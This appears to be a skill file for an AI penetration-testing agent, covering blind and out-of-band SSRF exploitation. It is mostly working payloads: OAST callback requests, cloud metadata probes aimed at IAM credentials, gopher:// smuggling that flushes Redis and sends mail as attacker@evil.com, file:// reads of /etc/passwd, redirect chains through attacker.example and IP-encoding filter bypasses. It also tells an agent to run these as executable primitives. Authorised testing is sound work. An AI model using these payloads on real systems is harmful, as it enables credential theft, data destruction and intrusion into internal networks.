---
name: blind-ssrf
domain: web-attacks
category: web-attacks
tier: balanced
description: Exploit blind/out-of-band SSRF through OAST callbacks, cloud metadata endpoints, and internal service reachability when responses give no direct feedback.
toolRefs:
  - httpRequest
  - parseResponse
  - checkOastCallbacks
  - clearOastCallbacks
  - cloudMetadataProbe
  - recordEvidence
  - writeFinding
  - getTargetSummary
  - runPrimitive
primitives: [ssrfOast, ssrfMetadata]
triggers:
  - blind ssrf exploitation
  - oast out of band callback
  - cloud metadata 169.254.169.254
  - internal service reachability
  - server side request forgery test
contextBoosts: []
toolChains: []
compositionRules: {}
mitreAttack:
  - T1190
  - T1078
  - T1499
owaspRefs:
  - A10:2021
---

# Blind & Out-of-Band SSRF

## When to Use
Use when a server accepts a URL/host input (webhook, import, avatar fetch, PDF render, SSR proxy) but returns no direct response body from the fetched resource. Trigger when you need OAST-based confirmation or want to reach cloud metadata / internal services.

## Detection Approach
1. **Identify URL-taking parameters.** Enumerate inputs that cause the server to make outbound requests (file import, preview, fetch-by-url, callback registration).
2. **Plant an OAST callback.** Point the input at a unique collaborator/OAST hostname you control and clear prior callbacks first. Then perform the server action.

**Payload:** OOB detection via HTTP callback host:

```http
POST /api/import HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://oast-abc123.example.oast.probe/hit"}
```

OOB detection via DNS-only callback (works when egress HTTP is filtered but DNS resolves):

```
{"url": "http://d53a9f.target-id.oast.dns.example"}
```

3. **Poll for the callback.** Use `checkOastCallbacks` after the action. An inbound request to your OAST host from the target confirms SSRF even with no response feedback.
4. **Target cloud metadata.** Submit the link-local address `169.254.169.254` (with versioned paths like `/latest/meta-data/iam/security-credentials/`) via `cloudMetadataProbe` to test for credential disclosure on cloud hosts.

**Payload:** Cloud metadata probes (AWS / GCP / Azure):

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com

GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1

GET /fetch?url=http://169.254.169.254/latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 300

GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
Metadata-Flavor: Google
```

5. **Probe internal reachability.** Cycle through internal IP ranges and common ports; differentiate "connection refused" from "timeout" to map which internal services are reachable.
6. **Switch logic.** If OAST fires but metadata is blocked, document egress capability. If only timeouts occur, use timing differentials to infer reachability.

## Payload Techniques

**gopher:// — full arbitrary TCP request smuggling (e.g. internal SMTP, Redis):**

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0Ahttp://oast.example/hit
```

```
gopher://internal-mail:25/_MAIL FROM:<attacker@evil.com>%0D%0ARCPT TO:<victim@target.com>%0D%0ADATA%0D%0ASubject: SSRF proof%0D%0A%0D%0AOOB hit.%0D%0A.%0D%0AQUIT
```

**file:// scheme probe (local file read via URL fetcher):**

```
file:///etc/passwd
file:///etc/hostname
file:///C:/Windows/win.ini
```

**Redirect-chaining SSRF — bypass allow-lists that validate the first hop:** host a redirect on your server:

```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

then feed the redirector to the vulnerable parameter:

```http
GET /fetch?url=https://attacker.example/redir HTTP/1.1
Host: target.com
```

Chained double-redirect (`302 → 302 → metadata`) defeats validators that re-check the second hop but not the third.

**Filter bypass via alternate IP encodings for 169.254.169.254:**

```
http://2852039166/            # decimal encoding
http://0xA9FEA9FE/            # hex encoding
http://0251.0376.0251.0376/   # octal encoding
http://[::ffff:a9fe:a9fe]/    # IPv6-mapped IPv4
http://169.254.169.254.nip.io/# attacker-controlled DNS resolving to link-local
```

## Pitfalls
- Declaring safe on absence of response body — blind SSRF is proven by callbacks, not replies.
- Forgetting to clear OAST state, causing false attribution from prior tests.
- Assuming HTTPS-only inputs reject metadata (IP-literal and decimal/hex IP encodings often bypass filters).
- Confusing DNS resolution callbacks (filter reached) with actual content fetch.

## Verification & Impact
- **Confirmed:** OAST callback received, metadata credentials returned, or internal service interaction evidenced.
- **Suspected:** Timing differentials consistent with internal reachability.
- Document the vulnerable parameter, the reached destination, and exposed data (IAM keys, internal responses). Use `writeFinding` with callback evidence.

## Key Concepts
| Term | Meaning |
|------|---------|
| OAST | Out-of-band application security testing |
| Blind SSRF | No direct response from fetched resource |
| Link-local metadata | 169.254.169.254 cloud credential store |

## Primitive Execution

The attack classes above are executable through the primitive registry. Invoke each
primitive by its id below using the run-primitive execution tool instead of re-firing
payloads manually; confirmed results pass through the evidence gate and commit as
findings with exploit proofs automatically.

| Primitive id | Coverage |
|---|---|
| `ssrfOast` | SSRF with OAST callback oracle |
| `ssrfMetadata` | cloud metadata endpoint (169.254.169.254) probing |
